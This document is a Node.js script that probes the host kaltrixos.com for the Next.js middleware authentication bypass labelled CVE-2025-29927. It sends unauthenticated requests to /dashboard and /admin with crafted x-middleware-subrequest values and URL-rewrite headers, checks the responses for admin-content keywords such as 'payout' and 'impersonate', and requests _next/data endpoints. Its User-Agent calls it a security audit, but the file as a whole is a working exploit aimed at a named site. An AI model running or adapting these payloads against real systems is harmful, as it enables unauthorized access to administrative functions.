#!/usr/bin/env node
'use strict';

const https = require('https');

function request(pathname, headers) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: 'kaltrixos.com',
      path: pathname,
      method: 'GET',
      headers: Object.assign({ 'User-Agent': 'KaltrixOS-security-audit' }, headers),
    }, res => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve({
        status: res.statusCode,
        location: res.headers.location || '',
        bodyLength: body.length,
        adminHints: /\b(approve|verify|suspend|payout|impersonate)\b/i.test(body),
      }));
    });
    req.on('error', reject);
    req.end();
  });
}

async function main() {
  console.log('=== Middleware Bypass Probe ===\n');
  console.log('No session cookie is sent; a bypass must work without authentication.\n');

  const payloads = [
    ['CVE-2025-29927 middleware x5', 'middleware:middleware:middleware:middleware:middleware'],
    ['CVE-2025-29927 src/middleware x5', 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'],
    ['CVE-2025-29927 pages/_middleware x5', 'pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware'],
    ['single middleware segment', 'middleware'],
    ['single src/middleware segment', 'src/middleware'],
    ['x-middleware-rewrite', '/'],
    ['x-original-url', '/dashboard'],
    ['x-rewrite-url', '/dashboard'],
  ];

  for (const route of ['/dashboard', '/admin']) {
    console.log(`--- ${route} ---\n`);
    for (const [name, value] of payloads) {
      try {
        const r = await request(route, { 'x-middleware-subrequest': value });
        console.log(`${name}: ${r.status} ${r.location || '(no redirect)'} (${r.bodyLength} bytes)`);
        if (r.adminHints) console.log('  *** admin-content indicator detected ***');
      } catch (err) {
        console.log(`${name}: Error - ${err.message}`);
      }
    }
    console.log('');
  }

  console.log('--- _next/data endpoints ---\n');
  for (const route of [
    '/_next/data/admin.json',
    '/_next/data/dashboard/admin.json',
    '/_next/data/build-manifest.json',
  ]) {
    try {
      const r = await request(route, {});
      console.log(`${route}: ${r.status} ${r.location || '(no redirect)'} (${r.bodyLength} bytes)`);
    } catch (err) {
      console.log(`${route}: Error - ${err.message}`);
    }
  }
}

main().catch(err => { console.error(err); process.exit(1); });
